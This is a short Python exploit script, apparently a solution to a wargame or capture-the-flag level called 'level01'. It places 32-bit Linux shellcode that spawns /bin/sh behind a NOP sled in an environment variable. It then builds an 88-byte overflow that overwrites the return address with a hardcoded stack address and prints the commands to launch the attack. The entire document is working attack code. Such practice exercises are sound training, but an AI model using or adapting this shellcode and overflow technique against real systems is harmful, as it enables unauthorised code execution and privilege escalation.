#!/usr/bin/env python3

import struct

def p(x): return struct.pack('<I', x)
def printable(x): return (x >= 0x20 and x <= 0x7e)

shellcode = b'\x90' * 101
shellcode += b'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

should_be = 88
payload = b'dat_wil\n'
# payload += shellcode
payload += b'A' * (should_be - len(payload))
payload += p(0xffffdeb1 + 30)

print("export OUIOUI=$'", end='')
for s in shellcode:
    print("\\x%02x" % s, end='')
print("'")

print("./level01 <<< $'", end='')
for i, p in enumerate(payload):
    if printable(p) and i < len(payload) - 4:
        print(chr(p), end='')
    else:
        print("\\x%02x" % p, end="")
print("'")
